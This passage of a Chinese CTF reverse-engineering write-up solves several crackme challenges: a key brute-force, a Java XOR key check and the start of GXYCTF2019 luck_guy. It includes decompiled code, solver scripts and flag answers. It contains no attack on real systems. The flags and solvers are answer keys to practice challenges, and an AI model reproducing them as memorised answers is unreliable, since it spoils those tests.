punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    n <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">for</span> char <span class="token keyword">in</span> dict1<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">39</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">==</span> text<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            n <span class="token operator">=</span> n <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>                <span class="token keyword">print</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    v3 <span class="token operator">=</span> v3 <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325134207108.png" alt="image-20220325134207108" /></p>
<p>爆破二：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>key1 <span class="token operator">=</span> <span class="token string">'adsfkndcls'</span></pre></td></tr><tr><td data-num="2"></td><td><pre>key2 <span class="token operator">=</span> <span class="token string">'killshadow'</span></pre></td></tr><tr><td data-num="3"></td><td><pre>text <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">39</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            flag <span class="token operator">+=</span> j</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325134532006.png" alt="image-20220325134532006" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>KLDQCUDFZO<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="java逆向解密"><a class="anchor" href="#java逆向解密">#</a> Java 逆向解密</h2>
<p>程序员小张不小心弄丢了加密文件用的秘钥，已知还好小张曾经编写了一个秘钥验证算法，聪明的你能帮小</p>
<p>张找到秘钥吗？ 注意：得到的 flag 请包上 flag {} 提交</p>
<p>附件下载，是个.class 文件</p>
<p>jd-gui 打开文件，反编译结果如下</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Reverse</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token class-name">Scanner</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>"<span class="token class-name">Please</span> input the flag <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token class-name">String</span> str <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>"<span class="token class-name">Your</span> input is <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> stringArr <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token class-name">Encrypt</span><span class="token punctuation">(</span>stringArr<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  </pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Encrypt</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> <span class="token class-name">Resultlist</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>      <span class="token keyword">int</span> result <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">^</span> <span class="token number">0x20</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>      <span class="token class-name">Resultlist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> KEY <span class="token operator">=</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">65</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> <span class="token class-name">KEYList</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> KEY<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>      <span class="token class-name">KEYList</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>KEY<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Result:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Resultlist</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">KEYList</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>"<span class="token class-name">Congratulations</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>      <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>"<span class="token class-name">Error</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="33"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220326202848427.png" alt="image-20220326202848427" /></p>
<p>根据源代码分析可知，我们输入一个字符串，然后经过一个 Encrypt 函数进行处理，在 Encrypt 函数中经过一</p>
<p>个 for 循环进行异或，然后将得到的新字符串与 KEY 进行比较，看看是否相等，根据判断结果输出 Result。</p>
<p>KEY 的值：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>KEY <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">180</span>, <span class="token number">136</span>, <span class="token number">137</span>, <span class="token number">147</span>, <span class="token number">191</span>, <span class="token number">137</span>, <span class="token number">147</span>, <span class="token number">191</span>, <span class="token number">148</span>, <span class="token number">136</span>, <span class="token number">133</span>, <span class="token number">191</span>, <span class="token number">134</span>, <span class="token number">140</span>, <span class="token number">129</span>, <span class="token number">135</span>, <span class="token number">191</span>, <span class="token number">65</span> <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>异或条件：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>result <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> + <span class="token number">64</span> ^ 0x20<span class="token punctuation">;</span></pre></td></tr></table></figure><p>Python 异或代码：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'@'</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x20</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220326203743067.png" alt="image-20220326203743067" /></p>
<p>java 异或代码：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> xor<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> KEY <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">65</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token class-name">String</span> flag <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> KEY<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token keyword">char</span> x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>KEY<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'@'</span><span class="token operator">^</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            flag <span class="token operator">+=</span> x<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220326204938652.png" alt="image-20220326204938652" /></p>
<h2 id="gxyctf2019luck_guy"><a class="anchor" href="#gxyctf2019luck_guy">#</a> [GXYCTF2019]luck_guy</h2>
<p>得到的 flag 请包上 flag {} 提交。</p>
<p>附件下载，查壳</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327185052623.png" alt="image-20220327185052623" /></p>
<p>无壳，且 64 位程序，用 64 位的 ida pro 打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327185134766.png" alt="image-20220327185134766" /></p>
<p>不难发现 patch_me 是一个关键函数</p>
<p>f5 反编译如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327185253300.png" alt="image-20220327185253300" /></p>
<p>意思就是将输入的字符串存到 v4 中，然后作为 patch_me () 函数的参数</p>
<p>跟进 patch_me () 函数如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327185347891.png" alt="image-20220327185347891" /></p>
<p>跟进 get_flag 函数，得到如下结果：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327185426137.png" alt="image-20220327185426137" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">unsigned</span> __int64 <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-3Ch]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-38h]</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  __int64 s<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-30h] BYREF</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-28h]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-8h]</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  v0 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token function">srand</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">200</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK, it's flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x28uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> f1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Solar not like you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Solar want a girlfriend"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        s <span class="token operator">=</span> <span class="token number">0x7F666F6067756369LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>          <span class="token keyword">else</span></pre></td></tr><tr><td data-num="41"></td><td><pre>            <span class="token operator">--</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2 <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token 